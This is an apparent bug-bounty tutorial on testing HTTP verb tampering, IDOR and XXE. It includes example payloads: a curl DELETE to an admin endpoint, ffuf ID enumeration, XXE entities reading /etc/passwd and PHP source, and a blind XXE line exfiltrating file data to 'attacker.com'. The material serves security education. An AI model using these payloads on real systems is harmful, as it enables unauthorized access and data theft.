# Web Attacks

[Relative Cheat Sheet](./web-attacks-cheat.md)

## Step-by-Step Guide for Testing and Exploiting Web Attacks (HTTP Verb Tampering, IDOR, XXE)

### 1. Understand Web Attack Types
   - **Explanation**: Web attacks include HTTP Verb Tampering (bypassing controls via method changes), Insecure Direct Object References (IDOR, accessing unauthorized objects via direct IDs), and XML External Entity (XXE, exploiting XML parsing for file access or SSRF). Each exploits specific misconfigurations.
   - **Why It's Done**: Knowing the attack types guides testing for specific weaknesses, like poor access controls or unsafe XML processing.
   - **Example**: Changing a GET to DELETE to bypass auth, or accessing `/user/123` as `/user/124`.

### 2. Test for HTTP Verb Tampering
   - **Explanation**: Send non-standard HTTP methods (e.g., PUT, DELETE, OPTIONS) to endpoints expecting GET/POST to bypass restrictions.
   - **Why It's Done**: Some apps enforce controls only on common methods, allowing unauthorized actions.
   - **Example**: `curl -X DELETE http://example.com/admin/delete` to delete resources without auth.

### 3. Identify IDOR Points
   - **Explanation**: Look for direct references in URLs, API calls, or AJAX (e.g., `/user/123`, `id=123`) that identify objects like users or files.
   - **Why It's Done**: Modifiable references can lead to unauthorized data access.
   - **Example**: `/profile?id=123` where `id` is a user ID.

### 4. Test IDOR Exploitation
   - **Explanation**: Modify the reference (e.g., change `id=123` to `id=124`) to access another user’s data or resources.
   - **Why It's Done**: Confirms if access controls are missing, allowing data breaches.
   - **Example**: Change `/user/123` to `/user/124` to view another user’s profile.

### 5. Mass Enumerate IDOR
   - **Explanation**: Fuzz IDs or encoded references (e.g., base64, MD5) using tools like ffuf to access multiple objects.
   - **Why It's Done**: Scales the attack to expose more unauthorized data.
   - **Example**: `ffuf -w ids.txt:FUZZ -u http://example.com/user/FUZZ`.

### 6. Test for XXE
   - **Explanation**: Submit XML payloads with external entities (e.g., `<!ENTITY xxe SYSTEM "file:///etc/passwd">`) to inputs processed by XML parsers.
   - **Why It's Done**: XXE can read files, perform SSRF, or cause DoS via entity expansion.
   - **Example**: XML form input with `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`.

### 7. Exploit XXE for Data Exfiltration
   - **Explanation**: Use blind XXE with out-of-band (OOB) exfiltration (`<!ENTITY xxe SYSTEM "http://attacker.com/?data=%file;">`) or base64 filters for code.
   - **Why It's Done**: Extracts data when direct output isn’t available.
   - **Example**: `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` to read source code.

### 8. Chain Attacks
   - **Explanation**: Combine IDOR with APIs, XXE with SSRF, or verb tampering with auth bypass for escalation.
   - **Why It's Done**: Increases impact, like accessing admin data or RCE.
   - **Example**: IDOR to access admin ID, then XXE to read internal files.

### 9. Test Prevention Measures
   - **Explanation**: Check for indirect references (UUIDs), method restrictions, or XML parser disabling external entities.
   - **Why It's Done**: Informs remediation, like using randomized IDs or secure parsing.
   - **Example**: Secure app uses UUIDs instead of sequential IDs.

### 10. Use Tools for Efficiency
   - **Explanation**: Use Burp for verb tampering, ffuf for IDOR fuzzing, or Postman for XML testing.
   - **Why It's Done**: Automates repetitive tasks and scales testing.
   - **Example**: Burp Intruder to fuzz `id` parameters.

This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, equips hunters to test web attacks effectively. Test ethically within scope.